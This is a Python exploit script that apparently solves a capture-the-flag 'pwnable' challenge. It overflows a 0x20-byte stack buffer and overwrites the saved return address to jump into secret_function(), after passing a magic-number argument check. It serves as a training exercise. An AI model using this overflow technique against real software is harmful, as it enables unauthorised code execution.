#!/usr/bin/env python3
"""
Exploit for guard/pwnable

Root bug:
- Stack buffer overflow in read_input(): read(0, buf, 0x64) with buf size 0x20.
- Overwrite saved RIP and return into secret_function().
"""

import struct
import subprocess
from pathlib import Path

BINARY = Path(__file__).with_name("pwnable")

# Gate in main:
#   atoi(argv[1]) - 0x656c6c6f == 0
HELLO_MAGIC_DEC = str(0x656C6C6F)

# Function addresses from non-PIE binary
SECRET_FUNCTION = 0x40124F
OFFSET_TO_RIP = 40  # 0x20 buffer + 8 saved RBP + RIP at +0x28


def build_payload() -> bytes:
    """Build overflow payload that safely passes strcmp() first."""
    prefix = b"givemeflag\n\x00"
    padding = b"A" * (OFFSET_TO_RIP - len(prefix))
    return prefix + padding + struct.pack("<Q", SECRET_FUNCTION)


def main() -> None:
    payload = build_payload()

    # stdbuf -o0 ensures putchar() output is flushed before expected crash.
    proc = subprocess.run(
        ["stdbuf", "-o0", str(BINARY), HELLO_MAGIC_DEC],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )

    output = proc.stdout.decode("latin-1", errors="ignore")
    print(output)

    # Expected: process may crash after secret_function returns (invalid next RIP).
    print(f"[i] exit code: {proc.returncode}")


if __name__ == "__main__":
    main()